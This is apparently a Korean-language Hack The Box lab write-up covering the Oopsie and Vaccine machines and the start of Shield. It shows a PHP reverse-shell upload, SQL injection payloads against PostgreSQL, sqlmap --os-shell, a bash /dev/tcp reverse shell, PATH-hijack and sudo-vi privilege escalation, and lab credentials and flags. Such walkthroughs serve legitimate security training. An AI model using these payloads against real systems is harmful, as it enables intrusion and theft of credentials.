# [HTB] - Starting Point

## Oopsie

**VPN Connection**

```bash
$ openvpn bban9Jo-startingpoint.ovpn
```

**Port Scanning**

``` bash
$ root@kali:~# nmap -sC -sV 10.10.10.28
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-15 16:42 KST
Nmap scan report for 10.10.10.28
Host is up (0.28s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.38 seconds
```

80번 포트가 열려있다. http 프로토콜을 주고 받는 포트다. 웹 서버에 접속해보자.

돌아다녀봐도 admin 이메일만 나와있고 딱히 없다.

Burp Suite로 요청을 보내보며 sitemap을 그려보면 로그인과 관련한 페이지가 있다. :rocket: Let's go

저번 문제에서 얻었던 admin / MEGACORP_4dm1n!! 으로 로그인된다. 로그인하면 Accounts 탭에서 계정정보를 볼 수 있다

`id` 변수 값에 따라 계정이 달라지는 걸 알 수 있다.

그리고 쿠키에 `role`,`user`변수가 있고, `user`변수에는 Access ID 값이 담겨있다.

그리고 우리가 쉘을 업로드해야할 거 같은 Uploads tab에서는 super admin의 권한이 필요하다고 한다.

그러면 super admin의 계정을 찾으면 되니까 Accounts 탭에서 `id`변수에 값 때려박아서 계정 찾으면 된다.


쿠키의 `user`값을 86575로 바꾸면 업로드가 가능하다. 그럼 이제 리버스 쉘을 업로드 해야 하는데,

Kali의 `/usr/share/webshells/php`경로에 가면 리버스 쉘이 있다. 거기서 IP만 내 것으로 바꿔주면 된다.

그 거 업로드 해주고 지정된 포트에서 listen 하고 있다가, 파일 업로드된 경로 찾아서 실행시켜주면 쉘이 따진다.

근데 경로가 안 나와 있어서 대충 `/uploads/filename.php` 했는데 맞았다. 개꿀. 못 찾았으면 `dirb`나 `dirsearch` 썼을 듯.

```bash
root@kali:~# nc -lvp 1234
listening on [any] 1234 ...
10.10.10.28: inverse host lookup failed: Unknown host
connect to [10.10.14.33] from (UNKNOWN) [10.10.10.28] 44254
Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 10:35:40 up 12:09,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

현재 접속한 계정의 쉘 정보를 확인해보자:

```bash
$ grep www-data /etc/passwd
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

`/sbin/nologin` 쉘은 로그인이 불가능하다. bash쉘로 바꿔줘야 다른 유저로 로그인할 수 있다:

```bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```

``` bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@oopsie:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@oopsie:/$ tty             
tty
/dev/pts/1
```

```bash
www-data@oopsie:/home/robert$ cat user.txt
cat user.txt
f2c74ee8db7983851ab2a96a44eb7981
```

 `robert`라는 유저가 존재한다는 건 알았는데, 현재 사용자는 `robert`가 아니다. `robert`의 로그인정보나 `robert`로 권한을 바꿀 수 있는 방법을 찾아야 한다.

웹 서버가 존재한다는 걸 아니까 웹 서버의 내용을 둘러봤다.

```bash
www-data@oopsie:/var/www/html/cdn-cgi/login$ cat db.php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>

```

`robert`의 mysql 계정정보를 얻을 수 있고  이걸로 아까 확인했던 `robert` 사용자로 접속하려고 하니까 된다:

```bash
www-data@oopsie:/home/robert$ su robert
su robert
Password: M3g4C0rpUs3r!

robert@oopsie:~$ id
id
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```

이제 `root`로 권한 상승해서 아마 `/root` 아래에 있는 파일을 읽어야 할 것 같다. 낼 함 ㅅㄱ

---

:rocket: ​https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

권한 상승을 시도할 때 쓸만한 게 많은 것 같다.

환경변수도 수정해보려고 하고, 설정파일들도 읽어봤지만 딱히 되는 게 없다.

찾아보다가 setuid가 설정된 파일을 찾을 수 있는 방법이 있다. `bugtracker`그룹이면서 setuid가 설정된 파일을 찾아보았다.

```bash
$ find / -perm -u=s -type f 2>/dev/null    
# SUID (chmod 4000) - run as the owner, not the user who started it.
```

``` bash
robert@oopsie:~$ find / -type f -group bugtracker -perm -u=s 2>/dev/null
/usr/bin/bugtracker
```

`/usr/bin/bugtracker` 바이너리를 `strings`로 추출해서 읽어보자. 

``` bash
$ strings bugtracker
```

```bash
...
------------------
: EV Bug Tracker :
------------------
Provide Bug ID: 
---------------
cat /root/reports/
....
```

바이너리 내부에서 `cat`을 사용한다.

**공격 방법**

`bugtracker` 바이너리에는 setuid 비트가 설정되어 있고 owner가 `root`이기 때문에 파일을 실행할 동안에는 `root`권한을 얻게 된다. 즉, 바이너리를 실행하는 동안에 쉘을 딸 수 있으면 `root`권한으로 쉘을 실행할 수 있다.

바이너리 내에서 `cat` 명령어를 실행하는데, `cat`명령은 `PATH` 환경변수를 참고해 실행된다.

&#10071; `PATH`를 수정해 `cat`이 실행될 때 참고하는 경로를 바꿔 임의의 명령어가 실행되게 하면, `cat`이 실행될 때 쉘이 따진다!!

``` bash
$ export PATH=/tmp:$PATH
$ cd /tmp
$ echo '/bin/sh' > cat
$ chmod 777 cat
```

이렇게 하면 `cat`을 실행할 때 `/bin/sh`을 실행하게 되고, `root` 권한으로 쉘이 따졌다!

``` bash
root@oopsie:/usr/bin# bugtracker
bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 1
1
---------------

# id
id
uid=0(root) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```

사용자가 `root`로 바꼈다.

``` sh
# id
uid=0(root) gid=1000(robert) groups=1000(robert),1001(bugtracker)
# cd /root
cd /root
# ls
reports  root.txt
```

`root.txt`를 읽으면 되는데 안 읽어진다. 왜냐하면 우리가 `cat`을 했을 때 `/tmp`에 있는 `cat(/bin/sh)`을 사용하도록 PATH를 설정해놨기 때문이다.

그래서 PATH에서 `/tmp`를 뺀 원래의 값으로 바꿔주면 된다. 

```sh
# export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
# cat root.txt
af13b0bee69f8a877c3faf667f7beacf
```

🏁 **user flag** : f2c74ee8db7983851ab2a96a44eb7981 

🏁 **root flag** : af13b0bee69f8a877c3faf667f7beacf

**Q.** 근데 `/home/robert` 에 `cat`만들고 PATH에 추가해줬는데 그건 왜 안 되는지 모르겠다...

## Vaccine

```
ftpuser / mc@F1l3ZilL4
```

이전 문제에서 얻은 정보

**VPN Connect**

```  bash
root@kali:~/HTB# openvpn bban9Jo-startingpoint.ovpn
```

**Enumeration**

``` bash
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-17 03:04 EDT
Nmap scan report for 10.10.10.46
Host is up (0.20s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: MegaCorp Login
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.79 seconds

```

FTP를 위한 21번 포트와    HTTP통신을 위한 80번 포트가 보인다.

**FTP** : TCP/IP 프로토콜을 가지고 서버와 클라이언트 사이의 파일을 전송하기 위한  프로토콜

```bash
root@kali:~/HTB/vaccine# ftp 10.10.10.46
Connected to 10.10.10.46.
220 (vsFTPd 3.0.3)
Name (10.10.10.46:root): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            2533 Feb 03  2020 backup.zip
226 Directory send OK.
ftp> get backup.zip
```

`backup.zip`을 압축해제 하려고 하니까 비밀번호가 걸려있다. 

```bash
root@kali:~/HTB/vaccine# sudo apt-get install fcrackzip
root@kali:~/HTB/vaccine# fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' backup.zip


PASSWORD FOUND!!!!: pw == 741852963
```

비밀번호를 찾았으니 압축을 해제하면 된다.

``` php
<?php
session_start();
  if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
    }
  }
?>

```

비밀번호의 `md5`값을 알 수 있고, 이를 크랙해보면 `qwerty789`다.

로그인하고 나면 검색창이 뜬다.

`search`를 get방식으로 받아 검색한다. sql injection이 매우 의심된다.

`Elixir'`을 입력해주니까

```bash
ERROR: unterminated quoted string at or near "'" LINE 1: Select * from cars where name ㅑilike '%Elixir'%' ^
```

에러메세지를 출력한다. `ilike`문(`like`에서 대소문자 무시)을 사용하고 `SELECT *`을 하기 때문에 UNION SELECT를 하려면 컬럼 갯수 먼저 알아내야 한다. 

```bash
[*] search : Elixir' order by 6--
[*] ERROR: ORDER BY position 6 is not in select list LINE 1: Select * from cars where name ilike '%Elixir' order by 6--%' ^
```

`order by` 가 6이 되었을 때 처음 에러를 발생하므로 컬럼의 갯수는 5개다.

```bash
[*] search : Elixir';SELECT null,current_database(),null,null,null--
[*] result : carsdb
```

5개의 컬럼을 select 하지만 화면에 보여지는 컬럼의 갯수는 4개이다. 첫 번째 컬럼이 아마 인덱스처럼 사용되고 있는 것 같다.. 그래서 첫 번째 위치만 아니면 우리가 원하는 값을 화면에 출력할 수 있다.

```bash
[*] search : Elixir';SELECT null,usename,passwd ,null,null FROM pg_shadow --
[*] result : username - postgres
			 password - md52d58e0637ec1e94cdfba3d1c26b67d01
```

아래의 쿼리는 문제와는 상관없는데 다음에 써먹을 일이 있을까 싶어서 해봤다. 테이블을 `CREATE`하고, 파일 내용을 `COPY`해와서 읽을 수 있다.

```bash
[*] search : Elixir';CREATE TABLE temp (t TEXT);COPY temp FROM '/etc/passwd';
[*] search : Elixir' UNION SELECT null,null,null,null,t FROM temp;
[*] result : irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
			games:x:5:60:games:/usr/games:/usr/sbin/nologin
			lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
			sync:x:4:65534:sync:/bin:/bin/sync
			root:x:0:0:root:/root:/bin/bash
			gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
			systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
			ftp:x:112:118:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
			syslog:x:104:110::/home/syslog:/usr/sbin/nologin
			sys:x:3:3:sys:/dev:/usr/sbin/nologin
			backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
			postgres:x:111:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
			systemd-network:x:101:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
			simon:x:1000:1000:simon:/home/simon:/bin/bash
			bin:x:2:2:bin:/bin:/usr/sbin/nologin
			daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
			man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
			lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
			landscape:x:108:114::/var/lib/landscape:/usr/sbin/nologin
			systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
			sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
			mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
			tcpdump:x:107:112::/nonexistent:/usr/sbin/nologin
			list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
			uuidd:x:106:111::/run/uuidd:/usr/sbin/nologin
			ftpuser:x:1002:1002:,,,:/home/ftpuser:/bin/sh
			pollinate:x:109:1::/var/cache/pollinate:/bin/false
			nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
			www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
			messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
			_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
			uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
			news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
			systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
			proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
```

injection 포인트를 발견했으면 어떻게 쉘을 실행시킬지, RCE를 할 수 있을지를 알아봐야 한다. 

`Postgresql command execution`, `Postgresql RCE` 등 검색해보면 자료들이 나오지만, `sqlmap`을 사용하면 편리하게 쉘을 실행시킬 수 있다. 사실 injection이 의심되는 곳에 `sqlmap`을 먼저 돌려봐도 괜찮다.

`sqlmap`의 `--os-shell`이라는 옵션은 웹 서버에 WebShell을 업로드하고 그 쉘과 interact 할 수 있게 해준다.

``` bash
root@kali:~# sqlmap -u "http://10.10.10.46/dashboard.php?search=Elixir" --cookie="PHPSESSID=re0iuha9bk36svlhqmijgod9h1" --os-shell
...
---
[11:10:24] [INFO] the back-end DBMS is PostgreSQL
back-end DBMS: PostgreSQL
[11:10:24] [INFO] fingerprinting the back-end DBMS operating system
[11:10:24] [INFO] the back-end DBMS operating system is Linux
[11:10:25] [INFO] testing if current user is DBA
[11:10:26] [INFO] retrieved: '1'
[11:10:26] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
[11:10:26] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> whoami
do you want to retrieve the command standard output? [Y/n/a] a
[11:10:47] [INFO] retrieved: 'postgres'
command standard output:
---
p
o
s
t
g
r
e
s
```

쉘이 따지긴 했는데 이 쉘에서 작업하는데는 무리가 있기 때문에 리버스 쉘을 실행시켜서 하자.

```bash
[Terminal 1]
root@kali:/# nc -lvnp 1234
listening on [any] 1234 ...

[Terminal 2]
os-shell> bash -c 'bash -i >& /dev/tcp/10.10.14.14/1234 0>&1'

[Terminal 1]
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.46] 45048
bash: cannot set terminal process group (21800): Inappropriate ioctl for device
bash: no job control in this shell
postgres@vaccine:/var/lib/postgresql/11/main$ id
uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)
```

`postgres` 로 로그인되어 있다. 필요한 명령어들을 사용하기 위해 bash 쉘로 업그레이드 해주자.

&#10071; https://github.com/security-cheatsheet/reverse-shell-cheatsheet - 여러 언어로 리버스 쉘 실행

```bash
postgres@vaccine:/var/lib/postgresql/11/main$ python3 -c 'import pty;pty.spawn("/bin/bash")'
```

웹 서버의 파일들 중 `dashboard.php`에 `postgres`의 계정정보가 있다.

```php
        try {
          $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
        }
```

`user.txt`를 찾아보자.

``` bash
postgres@vaccine:/var/lib/postgresql/11/main$ find / -name "user.txt" 2>/dev/null
/var/lib/postgresql/user.txt
postgres@vaccine:/var/lib/postgresql/11/main$ cat /var/lib/postgresql/user.txt
********************************
```

이제 이전문제와 같이 `root`로 권한을 상승시켜서 `root.txt`를 읽어야 한다.

&#10071; https://payatu.com/guide-linux-privilege-escalation - Linux 권한 상승을 할 수 있는 방법 6가지 알려줌.

**4. Exploiting SUDO rights/user**를 이용했다.

``` bash
postgres@vaccine:/var/lib/postgresql/11/main$ sudo -l
sudo -l
[sudo] password for postgres: P@s5w0rd!

Matching Defaults entries for postgres on vaccine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
postgres@vaccine:/var/lib/postgresql/11/main$ cat pg_bha.conf 

```

> $ **sudo -l** – Prints the commands which we are allowed to run as SUDO

`/bin/vi`와 `/etc/postgresql/11/main/pg_hba.conf` 는 `sudo`로 실행시킬 수 있다. 그러면 

```bash
postgres@vaccine:/var/lib/postgresql/11/main$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

를 해주면 `SUDO`로 vi 에디터가 켜진다. 여기서 그냥 `vi`가 아니라 `/bin/vi`를 해준 이유는 `PATH`환경변수를 보면 알 수 있다.

``` BASH
postgres@vaccine:~/11/main$ find / -name "vi" 2>/dev/null
/etc/alternatives/vi
/var/lib/dpkg/alternatives/vi
/usr/share/vim/vim81/lang/vi
/usr/share/locale/vi
/usr/bin/vi
/snap/core/7917/usr/bin/vi
/snap/core/7917/usr/share/locale/vi

postgres@vaccine:~/11/main$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

그냥 `vi`를 하게 되면 `/usr/bin/vi`를 사용하게 되어 `SUDO`권한으로 실행할 수가 없다.

`SUDO`권한으로 vi 에디터를 실행한 다음 쉘을 따야 한다.

&#10071;https://www.joinc.co.kr/w/Site/Vim/Documents/Tip/ExternalCommand - Vim으로 외부명령어 실행하기

`:shell`이나 `:sh`을 쓰면 된다고 한다.


``` bash
# DO NOT DISABLE!
# If you change this first entry you will need to make sure that the
# database superuser can access the database using some other method.
# Noninteractive access to all databases is required during automatic
# maintenance (custom daily cronjobs, replication, and similar tasks).
#
# Database administrative login by Unix domain socket

# TYPE  DATABASE        USER            ADDRESS                 METHOD

local   all             postgres                                ident
# "local" is for Unix domain socket connections only
local   all             all                                     peer
# IPv4 local connections:
host    all             all             127.0.0.1/32            md5
# IPv6 local connections:
host    all             all             ::1/128                 md5
# Allow replication connections from localhost, by a user with the
# replication privilege.
local   replication     all                                     peer
host    replication     all             127.0.0.1/32            md5
host    replication     all             ::1/128                 md:shell
:shell

root@vaccine:/var/lib/postgresql/11/main# id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
root@vaccine:~# cat root.txt
********************************
```

🏁 ​**user flag** : ********************************

🏁 **root flag** : ********************************

## Shield

### VPN Connect

``` bash
root@kali:~/HTB# openvpn bban9Jo-startingpoint.ovpn
```

### Enumeration

``` bash
root@kali:~# nmap -sC -sV 10.10.10.29
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-23 13:12 EDT
Nmap scan report for 10.10.10.29
Host is up (0.20s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0s
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3306/tcp open  mysql   MySQL (unauthorized)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

80번 포트가 열려있고 IIS 서버다. 3306번 포트에는 MySQL DB를 사용하고 있다.

`http://10.10.10.29:80`에 접속해 봤는데 ㄹㅇ 아무것도 없는 것 같다.. 쿠키도 없고, 코드를 넘겨주는 것도 없고, 주석도 없다. burp suite로 site map을 그려봤는데 딱히 없다. 이럴 땐 우선 `dirb`  혹은  `dirsearch`를 돌리고 본다.

```bash
root@kali:~# dirb http://10.10.10.29/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Aug 23 13:27:57 2020
URL_BASE: http://10.10.10.29/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.29/ ----
==> DIRECTORY: http://10.10.10.29/wordpress/                                                                                                                                                                                              
                                                                                                                                                                                                                                       
---- Entering directory: http://10.10.10.29/wordpress/ ----

```

디렉토리를 하나 찾았다!